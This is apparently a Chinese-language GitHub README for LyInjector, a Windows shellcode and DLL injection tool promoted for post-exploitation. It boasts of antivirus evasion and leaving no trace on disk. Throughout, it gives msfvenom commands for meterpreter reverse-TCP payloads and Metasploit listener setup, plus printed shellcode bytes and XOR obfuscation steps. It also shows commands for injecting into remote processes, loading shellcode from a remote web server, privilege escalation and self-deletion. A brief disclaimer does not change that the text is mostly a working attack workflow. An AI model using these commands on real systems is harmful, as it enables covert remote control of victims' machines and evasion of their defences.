# 应用层恶意代码注入器

<br>

<div align=center>

![image](https://user-images.githubusercontent.com/52789403/224480378-709a99e3-60e5-405f-9ae3-b64261c43423.png)

</div>

<br>

<div align=center>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/LyMemory) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![OSCS Status](https://cdn.lyshark.com/archive/LyScript/OSCS.svg)](https://www.oscs1024.com/project/lyshark/LyMemory?ref=badge_small)

</div>

<br>

一款功能强大的应用层`恶意代码`注入器，该工具可用于向第三方进程内强制插入`DLL`模块，也可用于插入一段`ShellCode`反弹后门，或实现汇编级`Call`调用功能，在后渗透中，也可将后门直接注入到特定进程内存内而不会在磁盘中留下任何痕迹，注入成功后`Metasploit`即可获取目标主机控制权，只要对端不关机则权限会一直维持，由于`内存注入`无对应磁盘文件，所以也不会触发杀软报毒，是一款不错的命令行版通用注入工具，你值得拥有。

## 免责声明

该项目仅用于安全技术研究与交流，禁止用于非法用途，本人不参与任何护网活动的攻击方不做黑产，若在主机中溯源到本工具，与本人没有任何关系，本人不承担任何法律责任！

## API 接口调用

本工具绿色无毒，下载后可将`LyInjector.exe`源程序拷贝到`C:\Windows\System32`目录下，方便用户在任何位置都可以直接调用，目前该工具具备`23`个子功能，如下是详细的功能参数列表。
```c
Microsoft Windows [版本 10.0.19042.1826]
(c) Microsoft Corporation。保留所有权利。

C:\Users\admin>LyInjector
 _            ___        _           _
| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __
| |  | | | |  | || '_ \ | |/ _ \/ __| __/ _ \| '__|
| |__| |_| |  | || | | || |  __/ (__| || (_) | |
|_____\__, | |___|_| |_|/ |\___|\___|\__\___/|_|
      |___/           |__/

----------------------------------------------------------
[*] 应用层恶意代码注入器
[+] 版本: 2.0.0
[+] 联系作者: me@lyshark.com
----------------------------------------------------------

  [+] 基础功能

         Show              显示当前所有可注入进程
         ShowDll           显示进程内的所有DLL模块
         Promote           尝试提升自身进程权限
         FreeDll           尝试卸载指定进程内的DLL模块
         GetFuncAddr       显示进程内特定模块内函数基址
         Delself           从系统中删除自身痕迹

  [+] 格式化功能

         Format            将字节数组格式化为一行并打印
         FormatFile        将字节数组格式化并写出到文件
         Xor               将文本中压缩后的字节数组进行异或并输出
         Xchg              将压缩后的字符串转为字节数组格式
         XorArray          将字节数组加密/解密为字节数组格式

  [+] 进程注入功能

         InjectDLL         注入DLL模块到特定进程内
         InjectSelfShell   注入字符串到自身进程并运行
         InjectArrayByte   注入字节数组到自身进程并运行
         FileInjectShell   从文件中读入字符串并注入运行
         InjectProcShell   注入字符串到远程进程并运行
         InjectWebShell    从远程加载字符串并注入自身进程
         AddSection        在PE文件中新增一个节区
         InsertShellCode   将ShellCode插入到PE中的指定位置处
         RepairShellOep    在ShellCode末尾增加跳转回原处的指令
         SetSigFlag        设置文件感染标志

  [+] 编码器

         EncodeInFile      从文件读入加密字符串并执行反弹
         EncodePidInFile   注入加密后的字符串到远程进程中
```









<br><br><br><br><br><br>















首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
```BASH
32位载荷生成
[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c

64位载荷生成
[root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
后台侦听器的配置也分为`32`位与`6`4位，使用工具时需要与载荷的位数相对应。
```BASH
32位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit

64位侦听器配置
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost 192.168.93.128
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

<br>

 - 工具参数列表预览
```C
Shell> InjectShellCode32.exe
  ____  _          _ _   ___        _           _
/ ___|| |__   ___| | | |_ _|_ __  (_) ___  ___| |_
\___ \| '_ \ / _ \ | |  | || '_ \ | |/ _ \/ __| __|
 ___) | | | |  __/ | |  | || | | || |  __/ (__| |_
|____/|_| |_|\___|_|_| |___|_| |_|/ |\___|\___|\__|
                                |__/

Usage: ShellCode 远程线程注入器
E-mail: me@lyshark.com

Options:
         --show              显示当前所有可注入进程
         --promote           尝试提升自身进程权限
         --delself           从系统中删除自身痕迹

 Format:
         --Format            将字节数组格式化为一行并打印
         --FormatFile        将字节数组格式化并写出到文件
         --Xor               将文本中压缩后的字节数组进行异或并输出
         --Xchg              将压缩后的字符串转为字节数组格式
         --XorArray          将字节数组加密/解密为字节数组格式

 Inject:
         --InjectSelfShell   注入字符串到自身进程并运行
         --InjectArrayByte   注入字节数组到自身进程并运行
         --FileInjectShell   从文件中读入字符串并注入运行
         --InjectProcShell   注入字符串到远程进程并运行
         --InjectWebShell    从远程加载字符串并注入自身进程

 Encode:
         --EncodeInFile      从文件读入加密字符串并执行反弹
         --EncodePidInFile   注入加密后的字符串到远程进程中
```

<br>

 - 列举出目前系统中支持注入的进程
```C
InjectShellCode32.exe --show

[*] x32 进程PID =>      4        进程名 => System
[*] x32 进程PID =>    124        进程名 => Registry
[*] x32 进程PID =>    588        进程名 => smss.exe
[*] x32 进程PID =>    836        进程名 => csrss.exe
[*] x32 进程PID =>    940        进程名 => wininit.exe
[*] x32 进程PID =>    948        进程名 => csrss.exe
[*] x32 进程PID =>   1012        进程名 => services.exe
```

 - 尝试使用令牌提权
```C
InjectShellCode32.exe --promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为管理员
```

 - 删除自身程序
```C
InjectShellCode32.exe --delself

[*] 自身已清除
```

 - 将攻击载荷格式化为一行纯字符串
```C
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

InjectShellCode32.exe Format --path d://shellcode.txt

fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
```

 - 将攻击载荷格式化为一行并写出到文本
```C
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://output_shellcode.txt
[+] 已储存 => d://output_shellcode.txt
```

 - 将一行攻击载荷进行异或处理
```C
InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark

% &{{%ssssssuspr'q{z&vuw{!vqps{!vqs {!vqrws%!tw"qu{!tqq{pr%%pr s" p urtwst{%s!v"qvuu"ssvp%%'v
```

 - 将一段压缩载荷转换成字节数组
```C
InjectShellCode32.exe Xchg --input d://output_shellcode.txt --output d://array.txt
[+] 字节已转为双字节
[*] 已写出ShellCode列表 => d://array.txt

"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
```

 - 对字节数组进行异或处理
```C
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

InjectShellCode32.exe XorArray --path d://array.txt --passwd lyshark

"\xbf\xab\xcc\x43\x43\x43\x23\x72\x91\xca\xa6\x27\xc8\x11\x73\xc8"
"\x11\x4f\xc8\x11\x57\x4c\xf4\x9\x65\xc8\x31\x6b\x72\xbc\x72"
"\x83\xef\x7f\x22\x3f\x41\x6f\x63\x82\x8c\x4e\x42\x84\xa\x36"
"\xac\x11\x14\xc8\x11\x53\xc8\x1\x7f\x42\x93\xc8\x3\x3b\xb3"
"\xf6\xe1\x15\x29\x43\x10\xbc\x96";
```

 - 将攻击载荷注入到自身进程内
```C
InjectShellCode32.exe InjectSelfShell --shellcode fce88f00002c201...
[+] 解码地址: 19db64
```

 - 将字节数组注入到自身进程内
```C
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

InjectShellCode32.exe InjectArrayByte --path d://shellcode.txt
[+] 解码地址: 19df20
```

 - 将一行字符串注入到自身进程内
```C
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

InjectShellCode32.exe FileInjectShell --path d://output_shellcode.txt
[+] 解码地址: 19df20
```

 - 从远程Web服务器加载字符串并注入到自身进程内
```C
192.168.1.100:80/shellcode.raw
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

InjectWebShell --address 192.168.1.100 --payload shellcode.raw
```

 - 直接注入加密后的攻击载荷到自身进程内
```C
InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark
% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

InjectShellCode32.exe EncodeInFile --path d://xor_shellcode.txt --passwd lyshark
[+] 解码ShellCode字节 => 708 bytes
[+] 格式化ShellCode字节地址 => 19df00
[*] 激活当前反弹线程 => 2a60000
```

 - 注入攻击载荷到远程进程
```C
InjectShellCode32.exe InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...
[*] 开始注入进程PID => 13372
[+] 打开进程: 360
[+] 已设置权限: 3866624
[*] 创建线程ID => 352
```

 - 注入加密后的攻击载荷
```C
% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

InjectShellCode32.exe EncodePidInFile --pid 8384 --path d://xor_shellcode.txt --passwd lyshark
[+] 解码ShellCode字节 => 708 bytes
[+] 读入ShellCode长度 => 1687292
[*] 开始注入进程PID => 8384 长度 => 354
[+] 打开进程: 340
[+] 已设置权限: 12451840
[*] 创建线程ID => 356
```

GitHUB地址：https://github.com/lyshark/ShellCodeInject
